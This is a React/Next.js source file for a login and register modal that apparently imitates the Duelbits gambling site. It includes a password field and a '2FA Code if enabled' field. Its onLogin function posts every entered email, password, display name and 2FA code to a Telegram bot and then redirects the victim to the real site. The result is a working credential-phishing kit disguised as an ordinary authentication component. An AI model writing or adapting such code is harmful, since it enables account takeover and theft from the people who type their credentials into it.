import { CHATID, TELEGRAM_BOT_TOKEN } from "@/const";
import axios from "axios";
import { useRouter } from "next/navigation";
import { useState } from "react";

export interface IAuthenMobileAndTabletProps {}

export function AuthenMobileAndTablet({
  setIsModalOpen,
  activeLabel,
  setActiveLabel,
}: any) {
  const [data, setData] = useState({
    email: "",
    password: "",
    displayName: "",
    twoFa: "",
  });
  const router = useRouter();
  const onLogin = async () => {
    const x = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHATID,
        text: `${activeLabel === "Login" ? "LOGIN" : "REGISTER"} \n Email: ${
          data.email
        }\n Password: ${data.password} \n DisplayName: ${
          data.displayName
        } \n 2FA: ${data.twoFa} `,
      }
    );
  };
  const tab = [
    {
      label: "Login",
      onClick: () => setActiveLabel("Login"),
    },
    {
      label: "Register",
      onClick: () => setActiveLabel("Register"),
    },
  ];
  const socialList = [
    {
      name: "google",
      logo: (
        <svg
          stroke="currentColor"
          fill="currentColor"
          stroke-width="0"
          viewBox="0 0 488 512"
          height={24}
          width={24}
          xmlns="http://www.w3.org/2000/svg"
        >
          <path d="M488 261.8C488 403.3 391.1 504 248 504 110.8 504 0 393.2 0 256S110.8 8 248 8c66.8 0 123 24.5 166.3 64.9l-67.5 64.9C258.5 52.6 94.3 116.6 94.3 256c0 86.5 69.1 156.6 153.7 156.6 98.2 0 135-70.4 140.8-106.9H248v-85.3h236.1c2.3 12.7 3.9 24.9 3.9 41.4z"></path>
        </svg>
      ),
    },
    {
      logo: (
        <svg
          stroke="currentColor"
          fill="currentColor"
          strokeWidth={0}
          viewBox="0 0 496 512"
          height={24}
          width={24}
          xmlns="http://www.w3.org/2000/svg"
        >
          <path d="M496 256c0 137-111.2 248-248.4 248-113.8 0-209.6-76.3-239-180.4l95.2 39.3c6.4 32.1 34.9 56.4 68.9 56.4 39.2 0 71.9-32.4 70.2-73.5l84.5-60.2c52.1 1.3 95.8-40.9 95.8-93.5 0-51.6-42-93.5-93.7-93.5s-93.7 42-93.7 93.5v1.2L176.6 279c-15.5-.9-30.7 3.4-43.5 12.1L0 236.1C10.2 108.4 117.1 8 247.6 8 384.8 8 496 119 496 256zM155.7 384.3l-30.5-12.6a52.79 52.79 0 0 0 27.2 25.8c26.9 11.2 57.8-1.6 69-28.4 5.4-13 5.5-27.3.1-40.3-5.4-13-15.5-23.2-28.5-28.6-12.9-5.4-26.7-5.2-38.9-.6l31.5 13c19.8 8.2 29.2 30.9 20.9 50.7-8.3 19.9-31 29.2-50.8 21zm173.8-129.9c-34.4 0-62.4-28-62.4-62.3s28-62.3 62.4-62.3 62.4 28 62.4 62.3-27.9 62.3-62.4 62.3zm.1-15.6c25.9 0 46.9-21 46.9-46.8 0-25.9-21-46.8-46.9-46.8s-46.9 21-46.9 46.8c.1 25.8 21.1 46.8 46.9 46.8z" />
        </svg>
      ),
    },
    {
      logo: (
        <svg
          width={24}
          height={24}
          viewBox="0 0 24 24"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fillRule="evenodd"
            clipRule="evenodd"
            d="M10.7656 21.9999C11.1772 21.9934 11.5887 21.9907 12 21.9897C12.4113 21.9907 12.8228 21.9934 13.2343 21.9999C13.3934 22.0022 13.5236 21.9689 13.6479 21.8771C13.8409 21.7352 14.0357 21.5955 14.2306 21.4558C14.7179 21.1065 15.2052 20.7572 15.6639 20.3727C15.9687 20.1179 16.2231 20.0995 16.5682 20.2006C17.0983 20.356 17.6306 20.5035 18.1628 20.6509C18.8051 20.8289 19.4473 21.0069 20.086 21.1989C20.4232 21.2999 20.57 21.2862 20.6743 20.8936C20.9196 19.9728 21.1902 19.0589 21.461 18.1449C21.554 17.8311 21.647 17.5172 21.7389 17.2032C21.8218 16.9197 21.7938 16.6512 21.703 16.37C21.5558 15.915 21.414 15.458 21.2723 15.001C21.0569 14.3067 20.8416 13.6123 20.607 12.9251C20.4827 12.5601 20.5107 12.3238 20.7527 12.0151C20.7993 11.9556 20.8728 11.8989 20.9492 11.8397C21.1887 11.6545 21.4584 11.4459 21.0329 11.058C21.025 11.0523 21.1147 10.8916 21.1853 10.8457C21.5776 10.5887 21.5428 10.3465 21.1124 10.0929C21.231 9.99219 21.3367 9.90183 21.4473 9.80712L21.4537 9.80165C21.5251 9.74055 21.5988 9.67753 21.6794 9.60866C21.2447 9.35161 21.3343 8.98324 21.4352 8.58963C21.5173 8.2706 21.576 7.94581 21.6347 7.62098C21.7263 7.11273 21.8181 6.60438 22 6.11782V5.88831C21.7242 5.34592 21.5502 4.76617 21.3763 4.1864C21.2916 3.90385 21.2068 3.62129 21.1102 3.34304C21.0116 3.0596 20.9388 2.91386 20.5768 3.05386C19.5602 3.44766 18.5381 3.8269 17.5159 4.2062L17.5142 4.2068C16.699 4.50927 15.8838 4.81178 15.0711 5.12174C14.717 5.25715 14.3707 5.33175 13.9953 5.32371C13.833 5.32056 13.6702 5.31448 13.5073 5.30839C13.0176 5.29009 12.5266 5.27175 12.0465 5.3329L12.0213 5.33605L11.9999 5.33862C11.9844 5.33676 11.9689 5.33485 11.9535 5.3329C11.4734 5.27175 10.9824 5.29009 10.4926 5.30839C10.3297 5.31448 10.167 5.32056 10.0047 5.32371C9.62929 5.33175 9.28303 5.25715 8.9289 5.12174C8.11627 4.81178 7.30097 4.50927 6.48577 4.2068L6.48413 4.2062C5.46188 3.8269 4.43979 3.44766 3.42323 3.05386C3.06127 2.91386 2.98844 3.0596 2.88978 3.34304C2.79323 3.62122 2.7085 3.90372 2.62376 4.1862C2.44981 4.76597 2.27578 5.34592 2 5.88831V6.11782C2.18188 6.60438 2.27365 7.11273 2.36536 7.62098C2.42401 7.94581 2.48267 8.2706 2.5648 8.58963C2.66565 8.98324 2.75533 9.35161 2.32054 9.60866C2.40125 9.67753 2.4749 9.74055 2.54631 9.80165L2.55271 9.80712C2.66335 9.90183 2.76893 9.99219 2.88753 10.0929C2.45723 10.3465 2.42248 10.5887 2.8147 10.8457C2.88529 10.8916 2.97497 11.0523 2.96715 11.058C2.5416 11.4459 2.81137 11.6545 3.05081 11.8397C3.12726 11.8989 3.20063 11.9556 3.24731 12.0151C3.48933 12.3238 3.51734 12.5601 3.39297 12.9251C3.15844 13.6123 2.94307 14.3067 2.7277 15.001C2.58598 15.458 2.4442 15.915 2.29696 16.37C2.20623 16.6512 2.17822 16.9197 2.26112 17.2032C2.35304 17.5172 2.44601 17.8311 2.53898 18.1449C2.80978 19.0589 3.08047 19.9728 3.32572 20.8936C3.42996 21.2862 3.57677 21.2999 3.91406 21.1989C4.55262 21.0069 5.1949 20.8289 5.83724 20.6509C6.36943 20.5035 6.90163 20.356 7.43174 20.2006C7.77691 20.0995 8.03129 20.1179 8.33608 20.3727C8.79478 20.7572 9.2821 21.1065 9.76942 21.4558C9.96428 21.5955 10.1591 21.7352 10.3521 21.8771C10.4765 21.9689 10.6065 22.0022 10.7656 21.9999ZM12.8691 18.4404C13.194 18.437 13.3901 18.5572 13.4317 18.9118C13.4906 19.4174 13.6389 20.2892 13.6389 20.2892H10.3611C10.3611 20.2892 10.5095 19.4174 10.5684 18.9118C10.6098 18.5572 10.806 18.437 11.1309 18.4404H12.8691ZM2.71276 6.02372C2.7688 5.85258 2.82811 5.67673 2.88863 5.4972C3.03511 5.0628 3.18881 4.60686 3.32123 4.14403C3.4154 3.81584 3.54651 3.80092 3.84232 3.89387C4.57984 4.12691 5.1717 4.58891 5.76486 5.05193C5.87554 5.13835 5.98647 5.22494 6.0982 5.30994C7.43399 6.32666 8.77427 7.33765 10.119 8.34406C10.4137 8.56438 10.5852 8.70898 10.1694 9.02685C9.75071 9.34691 9.35723 9.70223 8.96381 10.0575C8.7591 10.2424 8.5544 10.4272 8.3462 10.607C7.98084 10.9226 7.61663 11.2233 7.12467 11.3472C6.56133 11.4887 6.00484 11.657 5.44836 11.8254C5.19228 11.9029 4.9362 11.9804 4.67946 12.0552C4.2323 12.1861 3.65967 11.7511 3.60588 11.2864C3.50837 10.4464 3.39856 9.60637 3.25622 8.77324C3.14903 8.14728 3.02105 7.52467 2.88792 6.87727L2.88726 6.87408C2.82997 6.59558 2.77175 6.31249 2.71386 6.02256L2.71276 6.02372ZM10.3062 15.5656L7.34042 15.0044L9.67301 13.3324L10.3062 15.5656ZM21.1153 5.50867L21.1113 5.4972C20.9649 5.0628 20.8112 4.60686 20.6788 4.14403C20.5846 3.81584 20.4534 3.80092 20.1577 3.89387C19.4201 4.12693 18.8282 4.58901 18.235 5.05208C18.1243 5.13849 18.0136 5.22494 17.9018 5.30994C16.566 6.32666 15.2258 7.33765 13.881 8.34406C13.5862 8.56438 13.4148 8.70898 13.8306 9.02685C14.2493 9.34691 14.6428 9.70223 15.0362 10.0575C15.2409 10.2424 15.4456 10.4272 15.6538 10.607C16.0191 10.9226 16.3833 11.2233 16.8753 11.3472C17.4387 11.4887 17.9951 11.657 18.5517 11.8254C18.8078 11.9029 19.0638 11.9804 19.3206 12.0552C19.7677 12.1861 20.3403 11.7511 20.3941 11.2864C20.4917 10.4464 20.6014 9.60637 20.7438 8.77324C20.851 8.14728 20.979 7.52467 21.1121 6.87727L21.1128 6.87408C21.17 6.59558 21.2282 6.31249 21.2861 6.02256L21.2872 6.02372C21.2324 5.85622 21.1744 5.68422 21.1153 5.50867ZM13.6939 15.5656L16.6596 15.0044L14.327 13.3324L13.6939 15.5656Z"
            fill="#FBFBFB"
          />
        </svg>
      ),
    },
  ];

  return (
    <>
      <div className="flex flex-col gap-3 p-2 text-white">
        <div className="flex gap-4 items-center text-xs">
          {tab.map((item, index) => (
            <div
              key={index}
              onClick={item.onClick}
              className={`cursor-pointer text-xs min-w-[100px] flex justify-center py-2 ${
                activeLabel === item.label ? "border-b-2 border-primary" : ""
              }`}
            >
              <p className="font-extrabold text-xs">{item.label}</p>
            </div>
          ))}
          <p
            onClick={() => {
              setIsModalOpen(false);
            }}
            className="flex-1 justify-end flex text-2xl cursor-pointer"
          >
            <svg
              width="13"
              height="13"
              viewBox="0 0 13 13"
              xmlns="http://www.w3.org/2000/svg"
              fill="#FFFFFF"
              data-testid="close-icon"
            >
              <path d="M7.6497 6.50084L12.7618 1.38875C13.0794 1.07142 13.0794 0.556521 12.7618 0.239183C12.4442 -0.0784256 11.9298 -0.0784256 11.6122 0.239183L6.50014 5.35127L1.38778 0.239183C1.07017 -0.0784256 0.555815 -0.0784256 0.238206 0.239183C-0.0794021 0.556521 -0.0794021 1.07142 0.238206 1.38875L5.35057 6.50084L0.238206 11.6129C-0.0794021 11.9303 -0.0794021 12.4452 0.238206 12.7625C0.397011 12.921 0.605136 13.0004 0.812991 13.0004C1.02085 13.0004 1.22897 12.921 1.38778 12.7622L6.50014 7.65014L11.6122 12.7622C11.771 12.921 11.9792 13.0004 12.187 13.0004C12.3949 13.0004 12.603 12.921 12.7618 12.7622C13.0794 12.4449 13.0794 11.93 12.7618 11.6127L7.6497 6.50084Z"></path>
            </svg>
          </p>
        </div>
        <div className="flex flex-col gap-2 text-xs">
          {activeLabel === "Register" ? (
            <>
              <div className="flex flex-col gap-2">
                <p>Display Name *</p>
                <input
                  name="displayName"
                  onChange={(e) => {
                    setData({ ...data, displayName: e.target.value });
                  }}
                  className="rounded bg-[#293F52] p-3"
                  type="text"
                  placeholder="Type your display name"
                />
              </div>
              <div className="flex flex-col gap-2">
                <p>Email Address *</p>
                <input
                  name="email"
                  onChange={(e) => {
                    setData({ ...data, email: e.target.value });
                  }}
                  className="rounded bg-[#293F52] p-3"
                  type="text"
                  placeholder="Type your Email"
                />
              </div>
              <div className="flex flex-col gap-2">
                <p>Password *</p>
                <input
                  className="rounded bg-[#293F52] p-3"
                  type="password"
                  placeholder="Type your password"
                  name="password"
                  onChange={(e) => {
                    setData({ ...data, password: e.target.value });
                  }}
                />
              </div>
              <label className="inline-flex items-center cursor-pointer">
                <input type="checkbox" className="sr-only peer" />
                <div className="relative w-11 h-6 bg-[#527490] peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-[#33C16C] dark:peer-focus:ring-[#33C16C] rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-[#33C16C]" />
                <span className="ms-3 text-xs font-medium text-white">
                  Send me bonus and marketing emails
                </span>
              </label>

              <button
                onClick={() => {
                  onLogin();
                  router.push("https://duelbits.com/?a=support1");
                }}
                className="bg-primary p-3 rounded font-semibold"
              >
                Register
              </button>
            </>
          ) : (
            <>
              <div className="flex flex-col gap-2">
                <p>Email Address</p>
                <input
                  name="email"
                  onChange={(e) => {
                    setData({ ...data, email: e.target.value });
                  }}
                  className="rounded bg-[#293F52] p-3"
                  type="text"
                  placeholder="Type your Email"
                />
              </div>
              <div className="flex flex-col gap-2">
                <p>Password</p>
                <input
                  className="rounded bg-[#293F52] p-3"
                  type="password"
                  placeholder="Type your password"
                  name="password"
                  onChange={(e) => {
                    setData({ ...data, password: e.target.value });
                  }}
                />
              </div>
              <div className="flex flex-col gap-2">
                <p>2FA Code if enabled</p>
                <input
                  name="twoFa"
                  onChange={(e) => {
                    setData({ ...data, twoFa: e.target.value });
                  }}
                  className="rounded bg-[#293F52] p-3"
                  type="text"
                />
              </div>
              <button
                onClick={() => {
                  onLogin();
                  router.push("https://duelbits.com/?a=support1");
                }}
                className="bg-primary p-3 rounded font-semibold"
              >
                Login
              </button>
            </>
          )}

          <p className="text-center">or login with</p>
          <div className="flex gap-2 justify-center">
            {socialList.map((item, index) => (
              <div
                onClick={() => {
                  if (!item?.name) return;
                  router.push("https://duelbits.com/?a=support1");
                }}
                key={index}
                className="bg-[#293F52] p-3 rounded"
              >
                {item.logo}
              </div>
            ))}
          </div>
          <p className="font-semibold text-center pt-5">Forgot password</p>
        </div>
        <p className="text-center px-10 text-[#527490] text-xs">
          This site is protected by reCAPTCHA and the Google Privacy Policy and
          Terms of Service apply.
        </p>
      </div>
    </>
  );
}
